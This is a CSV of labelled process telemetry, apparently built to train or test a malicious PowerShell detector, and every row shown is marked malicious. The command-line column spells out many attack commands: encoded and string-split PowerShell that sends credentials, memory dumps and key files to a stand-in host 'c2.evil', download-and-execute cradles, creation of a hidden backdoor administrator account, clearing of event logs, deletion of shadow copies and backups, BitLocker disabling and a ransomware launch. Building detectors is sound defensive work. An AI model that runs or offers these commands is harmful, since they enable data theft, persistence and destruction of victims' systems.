guid,pid,command_line,parent_count,child_process_count,network_connections,dns_queries,files_created,has_invoke,has_download,has_encoded,entropy,first_seen,label
{806273b3-d3f3-6908-436e-e9d8-ae534324805c},8609,powershell -EncodedCommand JABiAHkAdABlAHMAIAA9ACAAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJwBDADoAXAB0AGUAbQBwAFwAZAB1AG0AcAAuAGQAbQBwACcAKQA7ACQAYgA2ADQAIAA9ACAAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkAOwBJAFcAUgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBCAG8AZAB5ACAAJABiADYANAA=,1,3,2,2,1,False,False,True,0.141,2025-11-06T08:33:12.206429+00:00Z,1
{6e5b285a-a1e4-6908-618d-9347-cffe74427a18},8610,Start-BitsTransfer -Source C:\temp\log.txt -Destination http://c2.evil/log.txt,1,2,4,2,4,False,False,False,0.385,2025-11-06T08:33:13.206468+00:00Z,1
{632dfd91-e458-6908-c6b3-2b6b-c61d63e617a2},8611,powershell -EncodedCommand YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAHQAZQBtAHAAXABmAGkAbABlAC4AYgBpAG4AIABDADoAXAB0AGUAbQBwAFwAZgBpAGwAZQAuAGIANgA0ADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AVQBwAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvACcALAAoAGcAYwAgAEMAOgBcAHQAZQBtAHAAXABmAGkAbABlAC4AYgA2ADQAIAAtAFIAYQB3ACkAKQA=,1,6,4,3,4,False,False,True,0.13,2025-11-06T08:33:14.206511+00:00Z,1
{21d3b8f2-2c68-6908-4b87-a503-8c0a25e0a60e},8612,IEX ('$creds = Get-Content C:\t'+'emp\creds.txt;IWR http://'+'c2.evil/creds -Method POS'+'T -Body $creds'),1,5,1,2,3,True,True,False,0.406,2025-11-06T08:33:15.206560+00:00Z,1
{0e7b10d3-4ce6-6908-0439-b84f-7490e5a7f50b},8613,Invoke-WebRequest -Uri http://c2.evil/ -Method POST -Body (Get-Process | Out-String),1,3,3,3,1,True,False,False,0.464,2025-11-06T08:33:16.206592+00:00Z,1
{1fa2e8fc-2b9e-6908-4b34-8aaf-842bea9a5102},8614,IEX ('$env:COMPUTERNAME + ' ' +'+' (whoami) | Out-File C:\t'+'emp\id.txt;certutil -urlc'+'ache -f C:\temp\id.txt ht'+'tp://c2.evil/id.txt'),1,6,5,1,3,True,False,False,0.324,2025-11-06T08:33:17.206630+00:00Z,1
{2609d490-3ac1-6908-daaa-4b67-2f7a3a63d868},8615,IEX ('IEX (IWR http://c2.evil/e'+'x.ps1);Send-File -Path C:'+'\temp\keys.pfx -Url http:'+'//c2.evil/'),1,3,5,3,2,True,True,False,0.402,2025-11-06T08:33:18.206673+00:00Z,1
{24c9ec0e-fcec-6908-4c56-a10e-97424f91a9ce},8616,$hyjdfs='Start-Process -FilePath 'C:\temp\beacon.exe' -ArgumentList '/stager' -WindowStyle Hidden';IEX $hyjdfs,1,5,1,3,2,True,False,False,0.391,2025-11-06T08:33:19.206751+00:00Z,1
{f651a5eb-5153-6908-03a4-8624-cb1d70fe5439},8617,"IEX ('rundll32.exe url.dll,File'+'ProtocolHandler C:\temp\m'+'al.doc')",1,3,5,3,3,True,False,False,0.457,2025-11-06T08:33:20.206785+00:00Z,1
{e94b5574-b845-6908-6110-3498-cad122e234bf},8618,powershell -EncodedCommand bQBzAGgAdABhACAAagBhAHYAYQBzAGMAcgBpAHAAdAA6AGEAPQBHAGUAdABPAGIAagBlAGMAdAAoACIAcwBjAHIAaQBwAHQAOgBoAHQAdABwADoALwAvAGMAMgAuAGUAdgBpAGwALwBzAC4AaAB0AGEAIgApAC4ARQB4AGUAYwAoACkAOwBjAGwAbwBzAGUAKAApAA==,1,1,3,2,2,False,False,True,0.189,2025-11-06T08:33:21.206831+00:00Z,1
{36aa227d-f528-6908-3180-3eb5-741c5cc7dbd1},8619,$wjhsiy='regsvr32 /s /n /i:http://c2.evil/s.sct scrobj.dll';IEX $wjhsiy,1,2,1,1,3,True,False,False,0.437,2025-11-06T08:33:22.206870+00:00Z,1
{6749de8d-42fc-6908-3b30-bb93-ff8f2748433e},8620,$jokbnn='cscript //E:jscript C:\temp\script.js';IEX $jokbnn,1,2,3,0,2,True,False,False,0.441,2025-11-06T08:33:23.206902+00:00Z,1
{e13c82d6-070e-6908-9465-e6a3-9e8a769c617f},8621,powershell -EncodedCommand dwBzAGMAcgBpAHAAdAAgAEMAOgBcAHQAZQBtAHAAXABzAGMAcgBpAHAAdAAuAHYAYgBzAA==,1,4,2,3,4,False,False,True,0.323,2025-11-06T08:33:24.206934+00:00Z,1
{23a5dff7-4f2e-6908-3d83-5caa-3de92086f1d3},8622,"rundll32.exe javascript:""..\..\mshtml,RunHTMLApplication "";eval(fetch('http://c2.evil/js').text())",1,5,4,2,2,False,False,False,0.388,2025-11-06T08:33:25.206972+00:00Z,1
{c2af7bab-cdf9-6908-cd41-cb4f-30623b4afedf},8623,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwA7AFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATQBlAHMAcwBhAGcAZQBCAG8AeABdADoAOgBTAGgAbwB3ACgAJwBIAGUAbABsAG8AJwApACIA,1,1,5,2,1,False,False,True,0.159,2025-11-06T08:33:26.207012+00:00Z,1
{bfd6277e-ef74-6908-2d3b-f29b-9d2504dbae9f},8624,"IEX ('rundll32.exe C:\temp\dllh'+'ost.dll,EntryPoint')",1,6,5,2,3,True,False,False,0.574,2025-11-06T08:33:27.207054+00:00Z,1
{1aba0afc-d1fa-6908-6308-c9aa-5ac27f1d8e4b},8625,powershell -EncodedCommand YwBtAHMAdABwAC4AZQB4AGUAIAAvAG4AaQAgAC8AcwAgAEMAOgBcAHQAZQBtAHAAXABwAHIAbwBmAGkAbABlAC4AaQBuAGYA,1,5,3,1,3,False,False,True,0.301,2025-11-06T08:33:28.207097+00:00Z,1
{4c3b519e-dd5d-6908-fb97-42b3-66a531262a60},8626,powershell -EncodedCommand bQBzAGkAZQB4AGUAYwAgAC8AcQB1AGkAZQB0ACAALwBpACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AZQB2AGkAbAAuAG0AcwBpAA==,1,1,1,0,1,False,False,True,0.295,2025-11-06T08:33:29.207134+00:00Z,1
{c215821f-85e9-6908-0689-2c8f-c99df3651230},8627,$ahtkgq='bitsadmin /transfer myjob http://c2.evil/evil.exe C:\temp\evil.exe';IEX $ahtkgq,1,5,3,3,2,True,False,False,0.42,2025-11-06T08:33:30.207163+00:00Z,1
{acf31b4d-3c80-6908-1711-5cc9-6328c2fd299c},8628,powershell -EncodedCommand dwBtAGkAYwAgAHAAcgBvAGMAZQBzAHMAIABjAGEAbABsACAAYwByAGUAYQB0AGUAIAAiAGMAbQBkACAALwBjACAAQwA6AFwAdABlAG0AcABcAGUAdgBpAGwALgBiAGEAdAAiAA==,1,5,1,2,4,False,False,True,0.252,2025-11-06T08:33:31.207201+00:00Z,1
{a5465125-b94c-6908-e34a-6414-fa50e05e9d2f},8629,IEX ('for /F %i in (C:\temp\hos'+'ts.txt) do @copy C:\temp\'+'payload.exe \\%i\C$\temp\'+'payload.exe'),1,6,4,3,2,True,False,False,0.33,2025-11-06T08:33:32.207236+00:00Z,1
{796a9818-b18b-6908-c1cb-f52b-d24adafb16a7},8630,$wrkbyn='netsh advfirewall set allprofiles state off';IEX $wrkbyn,1,4,2,3,4,True,False,False,0.4,2025-11-06T08:33:33.207275+00:00Z,1
{bdcd79ee-c520-6908-84c0-87b8-e29ef8f248a1},8631,powershell -EncodedCommand bgBlAHQAcwBoACAAaQBuAHQAZQByAGYAYQBjAGUAIABzAGUAdAAgAGkAbgB0AGUAcgBmAGEAYwBlACAAIgBFAHQAaABlAHIAbgBlAHQAIgAgAGEAZABtAGkAbgA9AGQAaQBzAGEAYgBsAGUAZAA=,1,2,3,0,3,False,False,True,0.217,2025-11-06T08:33:34.207314+00:00Z,1
{9c73c398-a130-6908-7438-8474-795b06e8868c},8632,IEX ('wevtutil cl Security'),1,2,3,1,2,True,False,False,0.643,2025-11-06T08:33:35.207350+00:00Z,1
{99d05cf0-9b1b-6908-15f6-8dab-f30e07780c9e},8633,powershell -EncodedCommand dgBzAHMAYQBkAG0AaQBuACAAZABlAGwAZQB0AGUAIABzAGgAYQBkAG8AdwBzACAALwBhAGwAbAAgAC8AcQB1AGkAZQB0AA==,1,2,1,3,2,False,False,True,0.301,2025-11-06T08:33:36.207386+00:00Z,1
{24228f6c-b8d0-6908-75fe-e766-69756e8fc527},8634,IEX ('wbadmin delete catalog -q'+'uiet'),1,2,2,1,4,True,False,False,0.6,2025-11-06T08:33:37.207421+00:00Z,1
{93584c22-23be-6908-1b53-2d75-5bab0569f9ac},8635,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALgBtAGkAYwByAG8AcwBvAGYAdAAtAGEAawBhAGQAbgBzAC4AYwBvAG0ALwBwAGEAdABjAGgALgBwAHMAMQAnACkAIgA=,1,5,4,2,3,False,False,True,0.15,2025-11-06T08:33:38.207456+00:00Z,1
{52495f4b-be0e-6908-8a07-f234-0bbd5765902a},8636,powershell -EncodedCommand SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7AEcAZQB0AC0AQQBEAFQAcgB1AHMAdAB9ACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAGQAYwAwADEALgBjAG8AcgBwAC4AbABvAGMAYQBsAA==,1,4,4,3,3,False,False,True,0.21,2025-11-06T08:33:39.207499+00:00Z,1
{1c1b06a1-600d-6908-fbe5-ec66-ba5340e8e3bc},8637,powershell -EncodedCommand dwBtAGkAYwAgAC8AbgBvAGQAZQA6AEAAQwA6AFwAdABlAG0AcABcAHQAYQByAGcAZQB0AHMALgB0AHgAdAAgAHAAcgBvAGMAZQBzAHMAIABjAGEAbABsACAAYwByAGUAYQB0AGUAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIABJAEUAWAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkAKQAiAA==,1,3,5,3,1,False,False,True,0.115,2025-11-06T08:33:40.207547+00:00Z,1
{e2ee3c76-dac9-6908-88df-14e7-12567ef71a10},8638,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAGkAbgBSAE0AXABDAGwAaQBlAG4AdAAgAC8AdgAgAEEAbABsAG8AdwBVAG4AZQBuAGMAcgB5AHAAdABlAGQAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADEAIAAvAGYA,1,5,1,1,3,False,False,True,0.161,2025-11-06T08:33:41.207592+00:00Z,1
{adab3072-9505-6908-864e-4233-5e917aad6e8a},8639,Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force,1,3,5,1,4,False,False,False,0.333,2025-11-06T08:33:42.207624+00:00Z,1
{37325a7f-6659-6908-5f54-113d-be55e330e3e1},8640,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABQAG8AcwBoAEMAMgAuAHAAcwBkADEAOwBJAG4AdgBvAGsAZQAtAFAAbwBzAGgAQwAyACAALQBTAGUAcgB2AGUAcgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAA6ADgAMAB9ACIA,1,2,1,2,2,False,False,True,0.197,2025-11-06T08:33:43.207669+00:00Z,1
{3ef27f33-cc91-6908-b48b-878b-01a5f813ddba},8641,$qjfyve='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/BruteRAT.ps1')';IEX $qjfyve,1,6,3,0,2,True,True,False,0.49,2025-11-06T08:33:44.207702+00:00Z,1
{9bf85468-6e14-6908-2fd4-a718-0b42011efe1e},8642,"rundll32.exe C:\temp\loader.dll,ExportFunction",1,3,4,1,1,False,False,False,0.522,2025-11-06T08:33:45.207733+00:00Z,1
{72c2f792-b7c3-6908-e30d-f888-e4e69999ccc0},8643,"powershell -c ""Start-Process 'C:\Program Files\Microsoft VS Code\Code.exe' --args '--remote=ssh-remote+user@evilhost'""",1,1,5,0,3,False,False,False,0.297,2025-11-06T08:33:46.207765+00:00Z,1
{f4e99572-afc4-6908-5e8c-b984-2895b94c19d0},8644,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBDAFUAXABDAG8AbgBzAG8AbABlACAALwB2ACAAVgBpAHIAdAB1AGEAbABUAGUAcgBtAGkAbgBhAGwATABlAHYAZQBsACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA==,1,4,3,2,4,False,False,True,0.222,2025-11-06T08:33:47.207804+00:00Z,1
{9275b5b8-82b7-6908-9382-d07f-94b9b63b7fc8},8645,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAZQByAHQAOgBcAEwAbwBjAGEAbABNAGEAYwBoAGkAbgBlAFwATQB5ACAAfAAgAFcAaABlAHIAZQAgAHsAJABfAC4AUwB1AGIAagBlAGMAdAAgAC0AbABpAGsAZQAgACcAKgBlAHYAaQBsACoAJwB9AH0AIgA=,1,3,3,2,2,False,False,True,0.174,2025-11-06T08:33:48.207844+00:00Z,1
{546989cf-e4e0-6908-e76f-fe49-fc7fef0baa34},8646,powershell -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwBhAGIAYwAxADIAMwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=,1,3,2,3,2,False,False,True,0.257,2025-11-06T08:33:49.207882+00:00Z,1
{bcb9e638-ec76-6908-87c1-3607-da4d6fb66552},8647,"$swxphv='powershell -nop -c ""IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((IWR http://c2.evil/b64).Content)))""';IEX $swxphv",1,3,3,2,2,True,True,False,0.318,2025-11-06T08:33:50.207918+00:00Z,1
{4d16954a-4f4a-6908-4e5b-fb4c-cb6b7b909e8f},8648,powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAGMAJwAsACcAJgAnACwAJwB7AEkARQBYACAAKABnAGMAIABDADoAXAB0AGUAbQBwAFwAbwBiAGYALgBwAHMAMQApAH0AJwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A,1,4,2,2,1,False,False,True,0.173,2025-11-06T08:33:51.207955+00:00Z,1
{8e4154cc-945f-6908-b4d5-b617-ba20d4adf7b8},8649,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBMAE0AXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAC8AdgAgAGYARABlAG4AeQBUAFMAQwBvAG4AbgBlAGMAdABpAG8AbgBzACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAwACAALwBmAA==,1,6,2,2,4,False,False,True,0.15,2025-11-06T08:33:52.207991+00:00Z,1
{949d8f6f-0f58-6908-d5b2-1a04-66df4b302097},8650,IEX ('netsh advfirewall firewal'+'l add rule name='Allow RD'+'P' dir=in action=allow pr'+'otocol=TCP localport=3389'),1,1,5,2,2,True,False,False,0.308,2025-11-06T08:33:53.208031+00:00Z,1
{ae128b5d-1274-6908-b355-0c83-2d0dfac1bde9},8651,powershell -EncodedCommand RQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAJwBSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIAAtACAAVQBzAGUAcgAgAE0AbwBkAGUAIAAoAFQAQwBQAC0ASQBuACkAJwA=,1,1,3,1,2,False,False,True,0.197,2025-11-06T08:33:54.208072+00:00Z,1
{921707d1-7c69-6908-ffe2-15cb-2025f3ba4076},8652,powershell -EncodedCommand UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABDAG8AbgB0AHIAbwBsAFwAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAJwAgAC0ATgBhAG0AZQAgACcAZgBEAGUAbgB5AFQAUwBDAG8AbgBuAGUAYwB0AGkAbwBuAHMAJwAgAC0AVgBhAGwAdQBlACAAMAA=,1,4,4,3,4,False,False,True,0.143,2025-11-06T08:33:55.208108+00:00Z,1
{679e316b-958e-6908-f622-8e62-d378d0f0a71c},8653,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHIAZABwAC4AcABzADEAJwApADsARQBuAGEAYgBsAGUALQBSAEQAUAAiAA==,1,5,4,1,4,False,False,True,0.175,2025-11-06T08:33:56.208155+00:00Z,1
{9c1fc7f1-ab7f-6908-7fa7-2f07-a771cf74a5da},8654,$inrhyj='net localgroup administrators hacker /add';IEX $inrhyj,1,5,1,1,4,True,False,False,0.444,2025-11-06T08:33:57.208198+00:00Z,1
{637b5a39-d62b-6908-20b4-3e54-5d3789ab96bb},8655,net user hacker Pass123! /add,1,2,5,3,2,False,False,False,0.621,2025-11-06T08:33:58.208227+00:00Z,1
{5467601e-c524-6908-a6ae-e611-cc7da99fa70e},8656,$mhwnin='net user hacker /active:yes';IEX $mhwnin,1,4,3,0,2,True,False,False,0.51,2025-11-06T08:33:59.208270+00:00Z,1
{43936266-d416-6908-72c9-54ca-12a577863e7b},8657,net user hacker /passwordreq:no,1,1,3,2,2,False,False,False,0.581,2025-11-06T08:34:00.208301+00:00Z,1
{5e6069fe-19f6-6908-7fc6-a6ce-2f74930e6d05},8658,powershell -EncodedCommand bgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAJwBSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIABVAHMAZQByAHMAJwAgAGgAYQBjAGsAZQByACAALwBhAGQAZAA=,1,1,2,2,3,False,False,True,0.245,2025-11-06T08:34:01.208345+00:00Z,1
{6c5e5242-68dd-6908-5f51-fadd-41f947765286},8659,IEX ('reg add 'HKLM\SOFTWARE\Mi'+'crosoft\Windows NT\Curren'+'tVersion\Winlogon\Special'+'Accounts\UserList' /v hac'+'ker /t REG_DWORD /d 0 /f'),1,2,1,0,3,True,False,False,0.333,2025-11-06T08:34:02.208381+00:00Z,1
{680bbe76-0ab7-6908-aae1-43f1-09b3791bdf35},8660,"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/avkill.ps1');Stop-Defender""",1,5,3,1,3,True,True,False,0.394,2025-11-06T08:34:03.208414+00:00Z,1
{5dc48d40-7110-6908-148e-db30-058c13a9ddff},8661,IEX ('wevtutil cl Microsoft-Win'+'dows-PowerShell/Operation'+'al'),1,4,4,0,3,True,False,False,0.485,2025-11-06T08:34:04.208448+00:00Z,1
{2dfb4382-d997-6908-d28d-b3e9-59df0b117f72},8662,IEX ('wevtutil cl Security'),1,2,3,0,4,True,False,False,0.643,2025-11-06T08:34:05.208485+00:00Z,1
{f5cd553f-df8d-6908-f990-1555-a36f00b397cf},8663,$kxtdsc='Remove-Item C:\Windows\System32\Winevt\Logs\* -Recurse -Force';IEX $kxtdsc,1,2,2,1,3,True,False,False,0.446,2025-11-06T08:34:06.208519+00:00Z,1
{879c1179-a3ac-6908-29ee-d653-f23754b26492},8664,powershell -EncodedCommand dgBzAHMAYQBkAG0AaQBuACAAZABlAGwAZQB0AGUAIABzAGgAYQBkAG8AdwBzACAALwBhAGwAbAAgAC8AcQB1AGkAZQB0AA==,1,2,1,1,3,False,False,True,0.301,2025-11-06T08:34:07.208554+00:00Z,1
{e7ea49ee-a55f-6908-9c0c-10c8-a1d2c7705627},8665,$rtodab='wbadmin delete systemstatebackup -quiet';IEX $rtodab,1,1,4,1,2,True,False,False,0.459,2025-11-06T08:34:08.208587+00:00Z,1
{a5920b01-3118-6908-ecc2-057d-8a03bf2722a1},8666,$ohkzgy='bcdedit /set {default} recoveryenabled No';IEX $ohkzgy,1,4,1,3,3,True,False,False,0.508,2025-11-06T08:34:09.208624+00:00Z,1
{9013f394-0fa1-6908-236c-1d4a-b1bfaf858796},8667,powershell -EncodedCommand YgBjAGQAZQBkAGkAdAAgAC8AcwBlAHQAIAB7AGQAZQBmAGEAdQBsAHQAfQAgAGIAbwBvAHQAcwB0AGEAdAB1AHMAcABvAGwAaQBjAHkAIABpAGcAbgBvAHIAZQBhAGwAbABmAGEAaQBsAHUAcgBlAHMA,1,3,4,1,4,False,False,True,0.207,2025-11-06T08:34:10.208660+00:00Z,1
{bd73f845-67bf-6908-bcba-ef25-036f5e613c40},8668,"IEX ('powershell -c ""Get-Volume'+' | Where {$_.DriveLetter}'+' | Disable-BitLocker""')",1,1,2,1,4,True,False,False,0.459,2025-11-06T08:34:11.208702+00:00Z,1
{bd501fad-0d82-6908-70c8-df3c-01a7d6a3d393},8669,$uvbonw='manage-bde -off C:';IEX $uvbonw,1,3,4,1,1,True,False,False,0.575,2025-11-06T08:34:12.208740+00:00Z,1
{f5771042-35da-6908-abf4-da85-9ca066b72795},8670,$bhpdkd='cipher /w:C:\';IEX $bhpdkd,1,6,5,2,4,True,False,False,0.629,2025-11-06T08:34:13.208776+00:00Z,1
{a9b38709-908a-6908-5973-b412-18f00b7d80f9},8671,net stop VSS,1,2,5,3,4,False,False,False,0.75,2025-11-06T08:34:14.208816+00:00Z,1
{f1f39a9b-9d21-6908-6eac-786b-c5f45f72af76},8672,powershell -EncodedCommand bgBlAHQAIABzAHQAbwBwACAAUwBEAFIAUwBWAEMA,1,6,4,2,4,False,False,True,0.433,2025-11-06T08:34:15.208859+00:00Z,1
{ada16327-6cff-6908-2711-7d9a-1447377ce604},8673,powershell -EncodedCommand bgBlAHQAIABzAHQAbwBwACAAdwBiAGUAbgBnAGkAbgBlAA==,1,1,2,3,2,False,False,True,0.4,2025-11-06T08:34:16.208910+00:00Z,1
{285b54bf-64d8-6908-94ad-bc9d-e7741f49d7c1},8674,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHcAaQBwAGUAcgAuAHAAcwAxACcAKQAiAA==,1,1,4,3,3,False,False,True,0.18,2025-11-06T08:34:17.208946+00:00Z,1
{1431528a-99ef-6908-685d-25f8-4046ea2514bc},8675,Start-Process 'C:\temp\ransom.exe' -ArgumentList '/encrypt' -WindowStyle Hidden,1,6,2,0,1,False,False,False,0.405,2025-11-06T08:34:18.208991+00:00Z,1
{759d0660-19af-6908-8b18-11bc-c2d53027015e},8676,IEX ('IEX (IWR http://c2.evil/r'+'ansom -UseBasicParsing)'),1,4,2,1,1,True,True,False,0.559,2025-11-06T08:34:19.209021+00:00Z,1
{45c83354-3659-6908-1ef2-2289-998404011498},8677,"$iktfxq='powershell -c ""& {IEX (gc C:\temp\encrypt.ps1)}""';IEX $iktfxq",1,5,1,0,1,True,False,False,0.557,2025-11-06T08:34:20.209051+00:00Z,1
{3ed3d722-e587-6908-a454-6b97-9d058756e050},8678,$yqfewq='reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f';IEX $yqfewq,1,1,4,2,4,True,False,False,0.35,2025-11-06T08:34:21.209081+00:00Z,1
{e8997388-9152-6908-d51b-5349-aef13b0305cd},8679,net use Z: \\fileserver\share /user:domain\admin Pass123!,1,4,5,2,1,False,False,False,0.439,2025-11-06T08:34:22.209119+00:00Z,1
{ed1a4d54-f1cf-6908-1963-19ed-19f86ac86a30},8680,Copy-Item C:\temp\payload.exe Z:\,1,3,3,1,1,False,False,False,0.545,2025-11-06T08:34:23.209157+00:00Z,1
{1b504d43-ad08-6908-cc78-227e-acc49b7cc800},8681,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGwAYQB0AGUAcgBhAGwALgBwAHMAMQAnACkA,1,4,2,1,4,False,False,True,0.203,2025-11-06T08:34:24.209189+00:00Z,1
